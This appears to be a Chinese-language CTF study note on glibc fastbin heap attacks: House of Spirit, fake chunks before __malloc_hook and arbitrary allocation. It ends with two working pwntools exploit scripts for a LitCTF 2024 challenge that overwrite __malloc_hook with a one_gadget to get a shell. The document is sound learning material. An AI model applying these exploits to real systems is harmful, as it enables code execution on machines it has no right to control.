---
title: Fastbin Attack
date: '2025-02-19 15:27:26'
updated: '2025-04-12 11:27:10'
---
第一个进入 fastbin 的 chunk 的 fd 是空的

## Fastchunk Double Free
详细看 double free 文

## House of spirit
### 伪造可被申请的 fake_fast_chunk
在 malloc_hook 之前的内存伪造 fake_fast_chunk，

或者说是利用 malloc_hook 之前的内存原有的数据伪造出符合 fastbin 的大小的 size 域

> （我看别人资料说是什么字节错位伪造？）
>

[找到的资料：](https://bbs.kanxue.com/thread-269145.htm)

> <font style="color:rgb(0, 0, 0);">0x7f：0111 1</font>**<font style="color:rgb(0, 0, 0);background-color:#FBDE28;">11</font>**<font style="color:rgb(0, 0, 0);">1</font>
>
> <font style="color:rgb(0, 0, 0);">0x56：0101 0</font>**<font style="color:rgb(0, 0, 0);background-color:#FBDE28;">11</font>**<font style="color:rgb(0, 0, 0);">0</font>
>
> <font style="color:rgb(0, 0, 0);">主要看的是AM位，加粗的两位，不能刚好是10，检测：</font>
>
> <font style="color:rgb(0, 0, 0);">(1)是否属于当前线程的main_arena</font>
>
> <font style="color:rgb(0, 0, 0);">(2)是否是mmap出来的chunk的检测</font>
>
> <font style="color:rgb(0, 0, 0);">所以按照道理来讲，尾数为4 5 c d四个系列不能通过检测，其他都可以的</font>
>

pwndbg 可以查找目标地址之前的内存数据构造 fake_fast_chunk：

```shell
pwndbg> find_fake_fast 0x7ffff7dd1b10
global_max_fast symbol not found, using the default value: 0x80
Use `set global-max-fast <address>` to set the address of global_max_fast manually if needed.
Searching for fastbin size fields up to 0x80, starting at 0x7ffff7dd1a98 resulting in an overlap of 0x7ffff7dd1b10
FAKE CHUNKS
Fake chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7ffff7dd1aed
prev_size: 0xfff7dd0260000000
size: 0x78 (with flag bits: 0x7f)
fd: 0xfff7a933f0000000
bk: 0xfff7a92fd000007f
fd_nextsize: 0x7f
bk_nextsize: 0x00
```

把这个 Addr 跟这时候 malloc_hook 的地址的偏移算出来，再在真正获取到 malloc_hook 的地址之后加上这个偏移，就可以得到程序运行时这个 fake_chunk 的地址了，

再拿去覆盖可以控制的 chunk 的 fd，可以申请出来 malloc_hook 前面这块内存

接着 edit 的时候加上一些 padding 就可以覆盖到 malloc_hook 了

剩余详看 house 系列 House of spirits

## <font style="color:rgba(0, 0, 0, 0.87);">Alloc to Stack</font>
核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。

## Arbitrary Alloc
Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。

使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。

Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。

## LitCTF 2024 heap2.23
刚打通用的 exp 多此一举用的 doublefree 来改 fd...（尴尬...）后面才反应过来...

```shell
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
link=process("./heap2.23")
libc=ELF('./glibc/2.23-0ubuntu3_amd64/libc-2.23.so')

def gdb_attach():
	gdb.attach(link,"set solib-search-path /home/pwner/FocusingCTF/glibc/2.23-0ubuntu3_amd64/")
	pause()

def create(idx,size):
	...

def delete(idx):
	...

def show(idx):
	...

def edit(idx,content):
	...

ogg=[0x4525a,0xef9f4,0xf0897]

create(1,144)
create(2,0x68)
create(3,0x68)
delete(1)
show(1)
malloc_hook=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x68
print(hex(malloc_hook))
libc_base=malloc_hook-libc.sym[b'__malloc_hook']
print(hex(libc_base))
# gdb_attach()
delete(2)
delete(3) #doublefree
delete(2)
create(4,0x68)
edit(4,p64(malloc_hook-0x23))
create(5,0x68)
create(6,0x68)
create(7,0x68) #malloc_hook
payload=b'a'*0x13+p64(libc_base+ogg[1])
edit(7,payload)
create(8,0x68)
# gdb_attach()

link.interactive()
```

下面是正常 uaf ...

```shell
...
ogg=[0x4525a,0xef9f4,0xf0897]

create(1,144)
create(2,0x68)
create(3,0x68)
delete(1)
show(1)
malloc_hook=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x68
print(hex(malloc_hook))
libc_base=malloc_hook-libc.sym[b'__malloc_hook']
print(hex(libc_base))
# gdb_attach()
delete(2)
edit(2,p64(malloc_hook-0x23))
create(5,0x68)
create(7,0x68) #malloc_hook
payload=b'a'*0x13+p64(libc_base+ogg[1])
edit(7,payload)
create(8,0x68)
# gdb_attach()

link.interactive()
```

